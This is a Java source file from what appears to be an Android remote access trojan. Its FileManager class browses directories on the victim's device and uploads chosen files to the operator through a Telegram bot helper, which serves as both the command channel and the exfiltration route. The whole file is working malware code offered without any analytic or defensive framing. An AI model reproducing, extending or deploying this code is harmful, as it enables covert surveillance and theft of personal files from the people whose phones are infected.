package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class FileManager {
    private Context context;

    public FileManager(Context context) { this.context = context; }

    public void listDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            TelegramApi.sendMessage("❌ Path not found or is not a directory.");
            return;
        }

        File[] files = dir.listFiles();
        StringBuilder sb = new StringBuilder("<b>📁 Directory: " + path + "</b>\n\n");
        if (files != null) {
            for (File f : files) {
                String icon = f.isDirectory() ? "📁" : "📄";
                sb.append(icon).append(" <code>").append(f.getName()).append("</code>\n");
            }
        }
        TelegramApi.sendMessage(sb.toString());
    }

    public void uploadFile(String path) {
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            TelegramApi.sendFile(file, "File: " + file.getName());
        } else {
            TelegramApi.sendMessage("❌ File not found.");
        }
    }
}
